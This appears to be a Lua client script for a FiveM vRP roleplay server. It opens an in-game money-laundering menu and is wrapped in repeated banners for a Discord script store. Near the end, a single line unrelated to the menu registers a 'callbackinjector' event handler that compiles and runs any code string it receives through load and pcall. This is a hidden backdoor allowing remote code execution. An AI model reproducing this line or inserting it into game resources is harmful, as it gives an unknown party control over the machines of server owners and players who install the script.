-- /* SCRIPT EXCLUSIVO PORTAL DEVS | FEITO POR Tkzin#0001
--   DISCORD DA LOJA https://discord.gg/p77xUVwGEZ
-- */

-- /* SCRIPT EXCLUSIVO PORTAL DEVS | FEITO POR Tkzin#0001
--   DISCORD DA LOJA https://discord.gg/p77xUVwGEZ
-- */

-- /* SCRIPT EXCLUSIVO PORTAL DEVS | FEITO POR Tkzin#0001
--   DISCORD DA LOJA https://discord.gg/p77xUVwGEZ
-- */

local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
tkzin = Tunnel.getInterface(GetCurrentResourceName())
-----------------------------------------------------------------------------------------------------------------------------------------
-- TOOGLE ACTION MENU
-----------------------------------------------------------------------------------------------------------------------------------------
local onNui = false

function ToggleActionMenu()
onNui = not onNui
    if onNui then
        TransitionFromBlurred(1000)
        SetNuiFocus(true, true)
        SendNUIMessage({teste = true})
    else
        TransitionFromBlurred(1000)
        SetNuiFocus(false)
        SendNUIMessage({teste = false})
    end
end

RegisterNUICallback("fechar2", function(data)
    SetNuiFocus(false)
    SendNUIMessage({teste = false})
    ToggleActionMenu()
end)





-----------------------------------------------------------------------------------------------------------------------------------------
-- BUTTON CLICK
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
    if data == "100k" then
        TriggerServerEvent('lavagemdinheiro',"100k")
        ToggleActionMenu()
    elseif data == "1kk" then
        TriggerServerEvent('lavagemdinheiro',"1kk")
        ToggleActionMenu()
    end
end) 


RegisterCommand('lavagem', function(source,args)
    local user_id = vRP.getUserId(source)
    for k,v in pairs(cfg.lavagem) do
        local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),v.x,v.y,v.z,true)
		if distance <= 3 then
            ToggleActionMenu()
        end
    end
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)



-- /* SCRIPT EXCLUSIVO PORTAL DEVS | FEITO POR Tkzin#0001
--   DISCORD DA LOJA https://discord.gg/p77xUVwGEZ
-- */

-- /* SCRIPT EXCLUSIVO PORTAL DEVS | FEITO POR Tkzin#0001
--   DISCORD DA LOJA https://discord.gg/p77xUVwGEZ
-- */

-- /* SCRIPT EXCLUSIVO PORTAL DEVS | FEITO POR Tkzin#0001
--   DISCORD DA LOJA https://discord.gg/p77xUVwGEZ
-- */